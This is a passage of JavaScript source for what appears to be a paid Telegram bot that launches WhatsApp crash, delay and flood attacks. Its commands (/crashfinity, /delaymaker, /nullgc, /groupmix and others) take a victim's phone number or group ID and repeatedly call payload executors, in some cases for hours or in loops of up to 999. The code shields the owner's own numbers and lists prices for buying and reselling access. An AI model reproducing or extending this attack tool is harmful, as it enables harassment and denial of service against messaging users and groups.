  console.log(`[DEBUG] /hidenseek: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /hidenseek: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonHideNSeekExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /hidenseek for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /hidenseek: ${error.message}`);
  }
});

botInstance.onText(/\/invisible(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /invisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /invisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /invisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /invisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /invisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /invisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /invisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /invisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /invisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /invisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonAndroidInvisibleKingExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /invisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /invisible: ${error.message}`);
  }
});

botInstance.onText(/\/delayxceed(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayxceed raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /delayxceed input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delayxceed: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayxceed +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delayxceed: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayxceed +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delayxceed: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delayxceed: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delayxceed: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delayxceed: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDelayXceedExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /delayxceed for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayxceed: ${error.message}`);
  }
});

botInstance.onText(/\/delaymaker(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delaymaker raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /delaymaker input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delaymaker: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delaymaker +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delaymaker: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delaymaker +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delaymaker: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delaymaker: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delaymaker: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delaymaker: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonFloodExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance, true)
    ]);
  } catch (error) {
    console.error(`Error in /delaymaker for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delaymaker: ${error.message}`);
  }
});

botInstance.onText(/\/crashfinity(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashfinity raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  

  console.log(`[DEBUG] /crashfinity input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashfinity: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /crashfinity +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /crashfinity: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashfinity: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashfinity: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashfinity: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 3; i++) {
          await xeonCrashFinity(formattedNumber, userNumber, chatId, botInstance, true);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /crashfinity for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashfinity: ${error.message}`);
  }
});

botInstance.onText(/\/listgc(?:\s(.+))?/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  try {
    await listGroups(userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /listgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /listgc: ${error.message}`);
  }
});

botInstance.onText(/\/groupfinity(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupfinity raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /groupfinity input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupfinity: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /groupfinity 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /groupfinity: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupfinity: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupfinity: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    for (let i = 0; i < 3; i++) {
        await xeonCrashFinity(rawTarget, userNumber, chatId, botInstance, false);
        await sleep(1000);
    }
  } catch (error) {
    console.error(`Error in /groupfinity for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupfinity: ${error.message}`);
  }
});

botInstance.onText(/\/nullgc(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /nullgc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /nullgc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /nullgc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /nullgc 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /nullgc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /nullgc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /nullgc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    for (let i = 0; i < 1; i++) {
        await xeonGcNull(rawTarget, userNumber, chatId, botInstance, false);
        await sleep(1000);
    }
  } catch (error) {
    console.error(`Error in /nullgc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /nullgc: ${error.message}`);
  }
  });

botInstance.onText(/\/hddhdhwowjeow(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xsucidegc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xsucidegc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xsucidegc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /xgroup 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xsucidegc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /xsucidegc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /xsucidegc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to group...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
└────────────────────────┘`,
    });

    for (let i = 0; i < 5; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      try {
        await xeongroupinvi(rawTarget, userNumber, chatId, botInstance);
        await sleep(3000);
      } catch (error) {
        break; // Exit the loop on error to prevent spamming
      }
    }

  } catch (error) {
    console.error(`Error in /xsucidegc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xsucidegc: ${error.message}`);
  }
});

botInstance.onText(/\/beowdbfkks(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xgroupios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xgroupios input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xgroupios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /xgroup 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xsucidegc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /xgroupios: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /xgroupios: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to group...
│ Target: ${rawTarget.replace('@g.us', '')}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    for (let i = 0; i < 999; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      try {
        await xgroupios(rawTarget, userNumber, chatId, botInstance);
      } catch (error) {
        break; // Exit the loop on error to prevent spamming
      }
    }

  } catch (error) {
    console.error(`Error in /xgroupios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xgroupios: ${error.message}`);
  }
});

botInstance.onText(/\/groupmix(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupmix raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /groupmix input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupmix: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupmix 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupmix: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupmix 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupmix: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupmix: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupmix: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });
    
      await groupMixInitiator(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupmix for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupmix: ${error.message}`);
  }
});

botInstance.onText(/\/groupui(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupui raw message: "${msg.text}"`);

